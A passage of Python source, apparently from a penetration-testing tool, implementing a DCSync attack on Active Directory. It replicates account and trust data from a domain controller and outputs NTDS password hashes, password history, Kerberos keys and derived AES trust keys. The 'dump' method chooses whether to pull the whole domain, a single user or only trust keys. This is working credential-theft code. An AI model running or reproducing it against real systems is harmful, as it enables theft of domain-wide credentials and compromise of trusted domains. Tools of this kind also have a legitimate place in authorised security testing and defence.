            constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value,
            constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value,
        ):
            for suffix, salt in salts:
                key = string_to_key(encryption_type, password, salt, None)
                lines.append(
                    f"{result.partner} ({direction}):{self.KERBEROS_TYPES[encryption_type]}{suffix}:{key.contents.hex()}"
                )
        return lines

    def dump(
        self,
        user=None,
        history=False,
        kerberos_keys=False,
        enabled=False,
        trust_keys=False,
        just_trust_keys=False,
    ):
        """Select the requested replication workflow and stream results to output."""
        output = DCSyncOutput(
            self.connection,
            self.domain,
            history=history,
            kerberos_keys=kerberos_keys,
            enabled=enabled,
            trust_keys=trust_keys or just_trust_keys,
        )
        with output, self:
            if just_trust_keys:
                results = self.sync_domain(accounts=False, trusts=True)
            elif user:
                results = (self.sync(user),)
                if trust_keys:
                    results = chain(
                        results, self.sync_domain(accounts=False, trusts=True)
                    )
            else:
                results = self.sync_domain(accounts=True, trusts=trust_keys)

            local_flat_name = (
                self.resolve_domain_flat_name()
                if trust_keys or just_trust_keys
                else None
            )
            message = (
                "Dumping the trust keys" if just_trust_keys else "Dumping the NTDS"
            )
            self.connection.logger.success(
                f"{message}, this could take a while so go grab a redbull..."
            )
            for result in results:
                if isinstance(result, DCSyncTrustResult):
                    output.write_trust(
                        self.format_trust_result(
                            result, history, kerberos_keys, local_flat_name
                        )
                    )
                else:
                    output.write_account(result)
        output.log_summary(just_trust_keys)

    def first_value(self, attributes, name):
        """Return the first replicated value for an attribute, if present."""
        values = attributes.get(name)
        return values[0] if values else None

    def decode_string(self, value):
        """Decode an optional UTF-16LE directory string."""
        return value.decode("utf-16le") if value else None

    def to_bytes(self, value):
        """Normalize Impacket's byte, integer-list, and byte-list representations."""
        if isinstance(value, bytes):
            return value
        if value and isinstance(value[0], int):
            return bytes(value)
        return b"".join(value)
